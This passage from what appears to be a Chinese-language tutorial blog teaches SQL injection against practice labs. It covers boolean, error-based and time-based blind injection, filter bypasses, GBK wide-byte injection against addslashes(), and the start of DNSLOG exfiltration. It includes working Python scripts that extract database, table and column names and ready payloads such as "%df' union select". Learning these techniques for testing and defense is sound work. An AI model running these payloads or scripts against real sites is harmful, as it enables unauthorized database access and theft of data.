class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">and</span> substr((<span class="hljs-keyword">select</span> database()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;c&#x27;</span> #查看database的第<span class="hljs-number">1</span>位字符是不是c<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">and</span> substr((<span class="hljs-keyword">select</span> database()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;d&#x27;</span> #查看database的第<span class="hljs-number">1</span>位字符是不是d<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">and</span> substr((<span class="hljs-keyword">select</span> database()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;e&#x27;</span> #查看database的第<span class="hljs-number">1</span>位字符是不是e<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">and</span> substr((<span class="hljs-keyword">select</span> database()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;f&#x27;</span> #查看database的第<span class="hljs-number">1</span>位字符是不是f<br>......<br></code></pre></td></tr></table></figure><p>如果说<code>substr((select database()),1,1) = &#39;a&#39;</code>这个语句为真, 则全体判断语句为真, 为假则全体判断语句为假<br>所以说这个语句实际上决定了整个语句的真假<br>以此类推, 先截取第一个字符, 判断是a-z, A-Z, 0-9这62个字符中的哪一个</p><ul><li>字符串截取</li><li>比较</li></ul><h3 id="字符串截取"><a href="#字符串截取" class="headerlink" title="字符串截取"></a>字符串截取</h3><h4 id="substr"><a href="#substr" class="headerlink" title="substr()"></a>substr()</h4><p>SUBSTR (str, pos)<br>截取从pos位置开始到最后的所有str字符串<br>SUBSTR (str, pos, len)<br>注意pos是从1开始数的</p><ul><li>被过滤了逗号 &#x3D;&gt; <code>select substr(&#39;2024-20-3&#39;,6,6)</code> <ul><li>用from和for绕过<code>select substr(&#39;2024-20-3&#39; from 6 for 5)</code></li></ul></li></ul><h4 id="mid"><a href="#mid" class="headerlink" title="mid()"></a>mid()</h4><p>SQL MID()) 函数用于得到一个字符串的一部分。这个函数被MySOL支持，但不被MS SOL Server和Oracle支持。<br>在SOL Server，Oracle 数据库中，我们可以使用 SOL SUBSTRING函数或者 SOLSUBSTR函数作为替代。<br>在mysgl里和substr0基本一样~~</p><ul><li>那么mid和substr的区别是什么呢 ?<br>  1.substr中长度是可选的但mid必须是3个参数<br>  2.substr支持这样的语法<br>  SUBSTRING(str FROM pos FOR Ien)<br>  SUBSTRING(str FROM pos)</li></ul><h4 id="right"><a href="#right" class="headerlink" title="right()"></a>right()</h4><p><code>right(str , len) #从右边开始截取len个字符</code><br><code>right(&#39;abcdef&#39;,2) = &#39;ef&#39;</code><br>这个不能单个字符的截取, 就会导致一些问题<br>比如说字符是单引号</p><h4 id="left"><a href="#left" class="headerlink" title="left()"></a>left()</h4><p><code>left(str , len) #从左边开始截取len个字符</code><br><code>left(&#39;abcd&#39;,2) = &#39;ab&#39;</code></p><h4 id="right-和ascii-配合"><a href="#right-和ascii-配合" class="headerlink" title="right()和ascii()配合"></a>right()和ascii()配合</h4><p>ascii(str)可以返回str第一个字符对应的ascii码<br><code>select ascii(right(&#39;abcdef&#39;,1))</code><br><img src="/images/Pasted%20image%2020240424181144%201.png"></p><h4 id="left-和reverse-和ascii"><a href="#left-和reverse-和ascii" class="headerlink" title="left()和reverse()和ascii()"></a>left()和reverse()和ascii()</h4><p><code>select ascii(reverse(left(&#39;abcdef&#39;,3)))</code></p><h4 id="trim"><a href="#trim" class="headerlink" title="trim()"></a>trim()</h4><p>trim()可以过滤指定的字符串, 常见用途是移除字首或字尾的空白<br><img src="/images/Pasted%20image%2020240427170956%201.png"></p><p><code>trim(BOTH/LEADING/TRAILING str_s from str_m) </code><br>BOTH&#x2F;LEADING&#x2F;TRAILING 三选一, 分别代表从两边&#x2F;开头&#x2F;结尾<br>str_s表示要过滤的字符串, str_m表示源字符串</p><h3 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h3><h4 id="x3D"><a href="#x3D" class="headerlink" title="&#x3D;"></a>&#x3D;</h4><h4 id="gt"><a href="#gt" class="headerlink" title="&gt;"></a>&gt;</h4><h4 id="lt"><a href="#lt" class="headerlink" title="&lt;"></a>&lt;</h4><h4 id="like"><a href="#like" class="headerlink" title="like"></a>like</h4><p>我们知道在 MySQL 中使用 SQL SELECT 命令来读取数据， 同时我们可以在 SELECT 语句中使用WHERE 子句来获取指定的记录<br>WHERE 子句中可以使用等号&#x3D;来设定获取数据的条件，比如<code>&quot;runoob_author =&#39;RUNOOB.COM&#39;&quot; 但是有时候我们需要获取 </code>runoob _author<code> 字段含有</code>“COM”<code>字符的所有记录，这时我们就需要在WHERE子句中使用SQL  LIKE子句 SQL LIKE 子句中使用百分号</code>%&#96;字符来表示任意字符，类似于UNIX或正则表达式中的星号*。</p><p>百分比(%)通配符允许匹配任何字符串的零个或多个字符。下划线_通配符允许匹配任何单个字符。</p><p><code>like &#39;s%&#39;</code>判断第一个字符是否为s<br>&#96;1 union select 1,database() like ‘s%’,3 –+</p><p><code>like &#39;se%&#39;</code>判断前面两个字符串是否为se<br>&#96;1 union select 1,database() like ‘se%’,3 –+</p><p><code>like &#39;%sq%&#39;</code> 判断是否包含se两个字符串<br>&#96;1 union select 1,database() like ‘%se%’,3 –+</p><p><code>like &#39;_____&#39;</code>判断是否为5个字符<br>&#96;1 union select 1,database() like ‘_____’,3 –+</p><p><code>like &#39;s____&#39;</code> 判断第一个字符是否为s<br>&#96;1 union select 1,database() like ‘s____’,3 –+</p><p>如果没有使用百分号<code>%</code>,LIKE 子句与等号&#x3D;的效果是一样的。</p><h4 id="正则表达式regexp-rlike"><a href="#正则表达式regexp-rlike" class="headerlink" title="正则表达式regexp rlike"></a>正则表达式regexp rlike</h4><p>基本<code>select (select语句) regexp &#39;正则&#39;</code></p><p><strong>regexp一般是不区分大小写的, 要在前面加上binary</strong><br><code>select binary (select语句) regexp &#39;正则&#39;</code></p><p>正常的查询语句<br><code>select username from users where id=1;</code></p><p>1)正则注入，若匹配则返回1，不匹配返回0<br><code>select (select username from users where id=1) regexp &#39;^a&#39;;</code><br><img src="/images/20200330004820823.jpg"><br><code>^</code>表示pattern(模式串)的开头。即若匹配到username字段下id&#x3D;1的数据开头为a，则返回1；否则返回0</p><p>2)regexp关键字还可以代替where条件里的&#x3D;号<br><code>select * from users where password regexp &#39;^ad&#39;;</code><br><img src="/images/20200330004837786.jpg"><br>使用场景：<br>    过滤了&#x3D;、in、like<br><code>^</code>若被过滤，可使用<code>$</code>来从后往前进行匹配</p><p>常用regexp正则语句：<br><code>regexp &#39;^[a-z]&#39;  #判断一个表的第一个字符串是否在a-z中</code><br><code>regexp &#39;^r&#39;      #判断第一个字符串是否为r</code><br><code>regexp &#39;^r[a-z]&#39; #判断一个表的第二个字符串是否在a-z中</code></p><h4 id="BETWEEN"><a href="#BETWEEN" class="headerlink" title="BETWEEN"></a>BETWEEN</h4><p><code>expr [NOT] BETWEEN begin_expr AND end_expr;</code></p><p>between筛选的是 expr &gt;&#x3D; begin_expr并且expr &lt;&#x3D; end_expr 的数据，如果不存则返回的是0 ;<br>not between筛选的是 expr &lt; begin_expr或者 expr &gt; end_expr 的数据，如果不存在则返回的是0;<br>如果 expr 返回的是 NULL，则between 也返回的是null</p><h4 id="in"><a href="#in" class="headerlink" title="in"></a>in</h4><p><code>select &#39;a&#39; in (&#39;a&#39;,&#39;b&#39;,&#39;c&#39;)</code><br>就是判断前面这个元素是不是属于in后面跟着的那个集合<br>依然是大小写不敏感, 字符数字都可以用<br>也有not in<br><img src="/images/Pasted%20image%2020240427175017%201.png"><br><img src="/images/Pasted%20image%2020240427175118%201.png"><br>要注意的是in也是默认大小写不敏感的<br><img src="/images/Pasted%20image%2020240427175130%201.png"></p><h4 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h4><p><code>^</code>按位异或<br>这玩意的水很深, 先说通过异或的操作来应对<code>#</code> <code>--+</code>等注释符被ban的情况</p><p>正常是这样的:<br><code>where id = &#39;   1&#39; and substr((select database()),1,1) = &#39;a&#39;#    &#39;</code><br><code>where id = &#39;   1&#39; and substr((select database()),1,1) = &#39;a&#39; --  &#39;</code><br>通过注释来完成语法的闭合</p><p>现在注释被ban了<br><code>where id = &#39;   1&#39;^(substr((select database()),1,1) = &#39;a&#39;)^&#39;1     &#39;</code><br>如果(substr((select database()),1,1) &#x3D; ‘a’)是1或0, 那么返回的也是1或0</p><h3 id="一个布尔盲注的案例"><a href="#一个布尔盲注的案例" class="headerlink" title="一个布尔盲注的案例"></a>一个布尔盲注的案例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#2024-5-5 16:34</span><br><span class="hljs-comment">#布尔盲注+二分查找</span><br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://47.97.68.252/vul/sqli/sqli_blind_b.php?name=kobe&#x27; and &#123;payload&#125;%23&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span><br>payloads = <span class="hljs-string">&quot;ascii(substr((&#123;select_sql&#125;),&#123;index&#125;,1))&gt;&#123;ascii_code&#125;&quot;</span><br><br><span class="hljs-comment">#select_sqls = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span><br>select_sqls = <span class="hljs-string">&quot;select group_concat(column_name) from information_schema.columns where table_schema=database()&quot;</span><br><span class="hljs-comment">#select_sqls = &quot;select password,username from users&quot;</span><br><span class="hljs-comment">#查询语句, 这个是爆表</span><br><br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    i+=<span class="hljs-number">1</span><br>    l=<span class="hljs-number">0</span><br>    r=<span class="hljs-number">128</span><br>    <span class="hljs-keyword">while</span> l+<span class="hljs-number">1</span> != r:<br>        mid = (l+r)//<span class="hljs-number">2</span> <span class="hljs-comment">#/是除   //是有取整</span><br>        payload1 = payloads.<span class="hljs-built_in">format</span>(select_sql=select_sqls,index=i,ascii_code=mid)<br>        res = requests.get(url=url.<span class="hljs-built_in">format</span>(payload=payload1))<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;your uid&#x27;</span> <span class="hljs-keyword">in</span> res.text:<br>            l=mid<br>        <span class="hljs-keyword">else</span>:<br>            r=mid<br>    <span class="hljs-keyword">if</span> l==<span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(r),end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="报错盲注"><a href="#报错盲注" class="headerlink" title="报错盲注"></a>报错盲注</h2><p>实际上也是布尔盲注的一种<br><code>if ( (substr=&#39;a&#39;), 执行某个函数过程中报错, 0)</code><br>那么用什么函数呢?<br><code>exp(x)</code> 返回e(2.71828)的x次方<br>    x足够大的时候呢就可以报错<br><code>cot(x)</code> 三角函数<br>    当x为0的时候报错</p><blockquote><p>例如<br><code>select if((条件为真),exp(5000),0)</code><br>    &#x3D;&gt;报错<br><code>select if((条件为假),exp(5000),0)</code><br>    &#x3D;&gt;不报错</p></blockquote><h2 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h2><p>没有回显,只能用sleep的时间来判断正确与否<br>有回显当然也能用, 但是你都有回显了,直接union select就好了</p><blockquote><p>一般条件表达式+sleep()</p></blockquote><h3 id="条件表达式"><a href="#条件表达式" class="headerlink" title="条件表达式"></a>条件表达式</h3><h4 id="case"><a href="#case" class="headerlink" title="case"></a>case</h4><blockquote><p>第一种用法:<br><code>case a1 when a2 then exp3 else exp4 end 含义: </code>if(a1&#x3D;&#x3D;a2) return exp3;else return exp4<br><img src="/images/Pasted%20image%2020240506235316.png"></p></blockquote><blockquote><p>第二种用法:<br><code>case when exp1 then exp3 else exp4 end</code><br>含义:<br><code>if(exp1) return exp3; else return exp4</code><br><img src="/images/Pasted%20image%2020240506235329.png"></p></blockquote><h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><p>&#96;if(exp1, exp2, exp3)<br>含义:<br>if(exp1) return exp2<br>else return exp3<br><img src="/images/Pasted%20image%2020240506235303.png"></p><h3 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h3><p><code>sleep(x)</code> 数据库睡眠x秒<br><img src="/images/Pasted%20image%2020240506235703.png"></p><h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><p><img src="/images/Pasted%20image%2020240506235823.png"><br><img src="/images/Pasted%20image%2020240506235852.png"><br><img src="/images/Pasted%20image%2020240506235911.png"><br><img src="/images/Pasted%20image%2020240506235919.png"><br><img src="/images/Pasted%20image%2020240507000006.png"><br><img src="/images/Pasted%20image%2020240506235935.png"><br><img src="/images/Pasted%20image%2020240507000024.png"><br><img src="/images/Pasted%20image%2020240507000035.png"></p><h3 id="一个时间盲注的案例"><a href="#一个时间盲注的案例" class="headerlink" title="一个时间盲注的案例"></a>一个时间盲注的案例</h3><p>条件</p><ul><li><code>select if(TRUE,&quot;真&quot;,&quot;假&quot;)</code></li></ul><p><img src="/images/Pasted%20image%2020240708190856.png"><br>靶场的语句<code>select * from table where uesrname=&#39;xx&#39;</code><br>payload<code>&#39; and if(条件,sleep(2),NULL);%23</code><br>数据包是这样的<br><img src="/images/Pasted%20image%2020240708191237.png"><br>所以构造为<code>?name=lili&#39;+and+if(TRUE,sleep(2),null)%3b%23</code>之后发送</p><ul><li><code>%23</code>是<code>#</code></li><li><code>%3b</code>是<code>;</code><br>看到返回的是2000ms多一点<br><img src="/images/Pasted%20image%2020240708191430.png"><br>改为<code>?name=lili&#39;+and+if(FALSE,sleep(2),null)%3b%23</code>之后<br>响应只有100ms<br><img src="/images/Pasted%20image%2020240708191529.png"><br>通过利用这一个布尔状态就可以进行爆库爆表<br>payload <code>?name=lili&#39; and if(substr((select database()),1,1)=&#39;p&#39;,sleep(2),null);%23</code><br><img src="/images/Pasted%20image%2020240708192924.png"></li></ul><p>同理可以写一个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#1.0</span><br><span class="hljs-comment">#2024-7-7</span><br><span class="hljs-comment">#时间盲注</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url = <span class="hljs-string">&quot;http://192.168.245.128/vul/sqli/sqli_blind_t.php?name=lili&#x27; and if(&#123;payload&#125;,sleep(2),NULL);%23&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span><br><br>payload = <span class="hljs-string">&quot;substr((select database()),1,1)=&#x27;&#123;code&#125;&#x27;&quot;</span><br><span class="hljs-keyword">for</span> code <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>,<span class="hljs-number">128</span>): <span class="hljs-comment">#在ASCII码中遍历code</span><br>    start_time = time.time()<br>    my_payload = payload.<span class="hljs-built_in">format</span>(code=<span class="hljs-built_in">chr</span>(code))<br>    my_url = url.<span class="hljs-built_in">format</span>(payload=my_payload)<br>    requests.get(url=my_url)<br>    <span class="hljs-keyword">if</span> time.time()-start_time &gt; <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(code))<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#2.0</span><br><span class="hljs-comment">#2024-7-7</span><br><span class="hljs-comment">#时间盲注+二分查找</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://192.168.245.128/vul/sqli/sqli_blind_t.php?name=lili&#x27; and if(&#123;payload&#125;,sleep(0.5),NULL);%23&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span><br>payloads = <span class="hljs-string">&quot;ascii(substr((&#123;select_sql&#125;),&#123;index&#125;,1))&gt;&#123;ascii_code&#125;&quot;</span><br>select_sqls = <span class="hljs-string">&quot;select database()&quot;</span> <span class="hljs-comment">#这里是要查找的语句</span><br><span class="hljs-comment">#select_sqls = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span><br><span class="hljs-comment">#select_sqls = &quot;select group_concat(column_name) from information_schema.columns where table_schema=database()&quot;</span><br><br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    i+=<span class="hljs-number">1</span><br>    l=<span class="hljs-number">0</span><br>    r=<span class="hljs-number">128</span><br>    <span class="hljs-keyword">while</span> l+<span class="hljs-number">1</span> != r:<br>        mid = (l+r)//<span class="hljs-number">2</span> <span class="hljs-comment">#/是除   //是有取整</span><br>        payload1 = payloads.<span class="hljs-built_in">format</span>(select_sql=select_sqls,index=i,ascii_code=mid)<br>        start_time = time.time()<br>        res = requests.get(url=url.<span class="hljs-built_in">format</span>(payload=payload1))<br>        <span class="hljs-keyword">if</span> time.time() - start_time &gt; <span class="hljs-number">0.5</span>:<br>            l=mid<br>        <span class="hljs-keyword">else</span>:<br>            r=mid<br>    <span class="hljs-keyword">if</span> l==<span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(r),end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>当前数据库中所有table<br><img src="/images/Pasted%20image%2020240708201414.png"><br>所有column<br><img src="/images/Pasted%20image%2020240708201501.png"></p><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><h3 id="什么是宽-x2F-窄字节"><a href="#什么是宽-x2F-窄字节" class="headerlink" title="什么是宽&#x2F;窄字节"></a>什么是宽&#x2F;窄字节</h3><p>当某字符的大小为一个字节时，称其字符为窄字节，当某字符的大小为两个或更多字节时，称其字符为宽字节，而且不同的字符编码方式和字符集对字符的大小有不同的影响</p><p>例如，在 ASCII 码中，一个英文字母（不分大小写）为一个字节，一个中文汉字为两个字节；在 UTF-8 编码中，一个英文字为一个字节，一个中文为三个字节；在 Unicode 编码中，一个英文为一个字节，一个中文为两个字节</p><h3 id="敏感函数-amp-选项"><a href="#敏感函数-amp-选项" class="headerlink" title="敏感函数 &amp; 选项"></a>敏感函数 &amp; 选项</h3><ul><li><code>addslashes()</code>函数：返回在预定义字符之前添加反斜杠的字符串</li><li><code>magic_quotes_gpc</code>选项：对 POST、GET、Cookie 传入的数据进行转义处理，在输入数据的特殊字符如 单引号、双引号、反斜线、NULL等字符前加入转义字符<code>\</code>，在高版本 PHP 中（&gt;&#x3D;5.4.0）已经弃用</li><li><code>mysql_real_escape_string()</code>函数：函数转义 SQL 语句中使用的字符串中的特殊字符</li><li><code>mysql_escape_string()</code>函数：和<code>mysql_real_escape_string()</code>函数基本一致，差别在于不接受连接参数，也不管当前字符集设定</li></ul><p>宽字节注入的本质是开发者设置<strong>数据库编码与 PHP 编码为不同的编码格式从而导致产生宽字节注入</strong>，例如当 Mysql 数据库使用 GBK 编码时，它会把两个字节的字符解析为一个汉字，而不是两个英文字符，这样，如果我们输入一些特殊的字符，就会形成 SQL 注入</p><p>为了防止 SQL 注入，通常会使用一些 PHP 函数，如<code>addslashes()</code>函数，来对特殊字符进行转义（我们之前说过，转义就是在字符前加一个<code>\</code>），反斜杠用 URL 编码表示是<code>%5c</code>，所以如果我们输入单引号<code>’</code>，它会变成<code>%5c%27</code>，这样我们就无法闭合 SQL 语句了<br><img src="/images/attach-2fc5fca7d9fc3058ea709dfee9f9e8921ca7c84b.png"><br>但是，如果我们输入<code>%df’</code>，它会变成<code>%df%5c%27</code>，这里，%df%5c是一个宽字节的GBK编码，它表示一个繁体字“運”<br><img src="/images/attach-f52162237de1ca3d2e18d832196cd1bed91972c0.png"><br>因为 GBK 编码的第一个字节的范围是 129-254，而<code>%df</code>的十进制是 223，所以它属于 GBK 编码的第一个字节，而<code>%5c</code>的十进制是 92，它属于 GBK 编码的第二个字节的范围 64-254，所以，<code>%df%5c</code>被数据库解析为一个汉字，而不是两个英文字符</p><h3 id="一、addslasehes-转义函数"><a href="#一、addslasehes-转义函数" class="headerlink" title="一、addslasehes()转义函数"></a>一、addslasehes()转义函数</h3><p><code>addslashes()</code> 是 PHP 中用于转义字符串中的特殊字符的函数之一。它会在指定的预定义字符（单引号、双引号、反斜线和 NUL<br>字符）前面添加反斜杠，以防止这些字符被误解为代码注入或其他意外操作。</p><h4 id="1-用法"><a href="#1-用法" class="headerlink" title="1. 用法"></a>1. 用法</h4><pre><code class="hljs">string addslashes ( string $str )</code></pre><blockquote><ul><li><strong>参数</strong> ：<ul><li><code>$str</code>：需要进行转义的字符串。</li></ul></li><li><strong>返回值</strong> ：返回转义后的字符串。</li></ul></blockquote><h4 id="2-示例"><a href="#2-示例" class="headerlink" title="2. 示例"></a>2. 示例</h4><pre><code class="hljs">$input = &quot;It&#39;s a beautiful day!&quot;;$escaped_input = addslashes($input);echo $escaped_input;</code></pre><p>在上述示例中，如果 <code>$input</code> 包含单引号 <code>&#39;</code>，调用 <code>addslashes()</code> 后将会得到 <code>&quot;It\&#39;s a beautifulday!&quot;</code>。这样做可以避免潜在的 SQL 注入等安全问题。</p><h3 id="二、宽字节注入"><a href="#二、宽字节注入" class="headerlink" title="二、宽字节注入"></a>二、宽字节注入</h3><p>在网站开发中，防范SQL注入是至关重要的安全措施之一。常见的防御手段之一是使用PHP函数 <code>addslashes()</code><br>来转义特殊字符，如单引号、双引号、反斜线和NULL字符。然而，宽字节注入攻击利用了这种转义机制的漏洞，通过特殊构造的宽字节字符绕过<br><code>addslashes()</code> 函数的转义，从而实现对系统的攻击。<br>    #### 1. 宽字节注入原理<br>通常情况下，SQL注入点是通过单引号来识别的。但当数据经过 <code>addslashes()</code><br>处理时，单引号会被转义成无功能性字符，在判断注入点时失效。攻击者利用宽字节字符集（如GBK）将两个字节识别为一个汉字，绕过反斜线转义机制，并使单引号逃逸，实现对数据库查询语句的篡改。</p><h4 id="2-示例与Payload构造"><a href="#2-示例与Payload构造" class="headerlink" title="2. 示例与Payload构造"></a>2. 示例与Payload构造</h4><ul><li>假设有以下测试payload：<br>输入payload:<br><code>&#39; or 1=1 #</code><br>经过 addslashes() 后：<br><code>\&#39; or 1=1 #</code></li></ul><p>分析：<code>&#39;</code>的url编码是<code>%27</code>，经过<code>addslashes()</code>以后，<code>&#39;</code>就变成了<code>\&#39;</code>，对应的url编码就是<code>%5c%27</code></p><ul><li><p>针对上述情况，可以构造绕过payload：</p><p>构造绕过payload：<br><code>%df&#39; or 1=1 #</code><br>经过 addslashes() 后：<br><code>%df\&#39; or 1=1 #</code></p></li></ul><p>分析:  我们在payload中的<code>&#39;</code>之前加了一个字符<code>%df</code>，经过<code>addslashes()</code>以后，<code>%df&#39;</code>就变成了<code>%df\&#39;</code>，对应的URL编码为：<code>%df%5c%27</code>当MySQL使用GBK编码时，会将<code>%df%5c</code> 解析成一个字，从而使得单引号<code>%27</code>成功逃逸。</p><h4 id="3-靶场场景示例："><a href="#3-靶场场景示例：" class="headerlink" title="3. 靶场场景示例："></a>3. 靶场场景示例：</h4><p>以sqli dumb series-32为例，讲解宽字节注入使用方式：<br>首先输入<code>?id=1&#39;</code>测试是否存在注入，发现单引号<code>&#39;</code>被转义成<code>\&#39;</code>失效了，考虑使用宽字节注入绕过转义符<br><img src="/images/5b23762be8be39e982dd8e528b3c10c2.png"><br>这里我们白盒审计发现编码类型为 GBK</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-string">&quot;SET NAMES gbk&quot;</span>);<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>);<br></code></pre></td></tr></table></figure><p>构造<code>?id=1%df&#39;</code>，页面有报错回显，说明单引号成功逃逸<br><img src="/images/ddb183179b22a0e3ac7b96e7e4ba9f03.png"><br>接下来使用常规思路构造payload获取数据库名等：<code>?id=100%df&#39; union select 1,database(),3 --+</code><br><img src="/images/791135b75847dafc373b34f299e428c0.png"></p><h4 id="4-防范措施"><a href="#4-防范措施" class="headerlink" title="4. 防范措施"></a>4. 防范措施</h4><ul><li><strong>避免直接使用</strong><code>addslashes()</code>：考虑替代方案如使用预处理语句或更安全的转义函数。</li><li><strong>严格验证用户输入</strong> ：确保只接受符合预期格式和内容的数据。</li><li><strong>统一字符编码方式</strong> ：避免混合使用不同字符编码方式来处理字符串。</li><li><strong>定期审查代码</strong> ：持续审查代码以发现潜在漏洞，并及时修复。</li></ul><p>通过加强对宽字节注入攻击原理及防范措施的了解，并采取相应措施加固系统安全性，可以有效降低系统受到此类漏洞威胁带来风险。保障用户数据和系统完整性是开发人员不可或缺的责任与挑战。</p><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p><a href="https://blog.csdn.net/qq_45691294/article/details/107376284">SQL注入之堆叠注入_堆叠注入函数-CSDN博客</a></p><h2 id="基于-DNSLOG-的注入"><a href="#基于-DNSLOG-的注入" class="headerlink" title="基于 DNSLOG 的注入"></a>基于 DNSLOG 的注入</h2><p>DNSLOG 是存储在 DNS 服务器上的域名信息，它记录着用户对域名的访问信息，类似日志文件。像是 SQL 盲注、命令执行、SSRF 及 XSS 等攻击但无法看到回显结果时，就会用到 DNSLOG 技术，相比布尔盲注和时间盲注，DNSLOG 减少了发送的请求数，可以直接回显，也就降低了被安全设备拦截的可能性</p><p>DNSLOG 注入优点众多，但利用条件也较为严苛</p><ul><li>只支持 Windows 系统的服务端，因为要使用 UNC 路径这一特性，Linux 不具备此特性</li><li>Mysql 支持使用<code>load_file()</code>函数读取任意盘的文件 ### UNC 路径</li></ul><p>UNC 全称 Universal Naming Convention，译为通用命名规范，例如我们在使用虚拟机的共享文件功能时，便会使用到 UNC 这一特性<br><img src="/images/Pasted%20image%2020240718144349.png"></p><p>UNC 路径的格式如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">\\<span class="hljs-number">192.168</span>.<span class="hljs-number">0.1</span>\test\<br></code></pre></td></tr></table></figure><p>这里我们使用运行使用 UNC 路径访问<code>www.dnslog.cn</code>，并使用 wireshark 抓包，可以看到确实存在对<code>www.dnslog.cn</code>这个域名进行 DNS 请求的流量，但是并不会在浏览器直接打开网站<br><img src="/images/Pasted%20image%2020240718144405.png"></p><h3 id="load-file-函数"><a href="#load-file-函数" class="headerlink" title="load_file() 函数"></a>load_file() 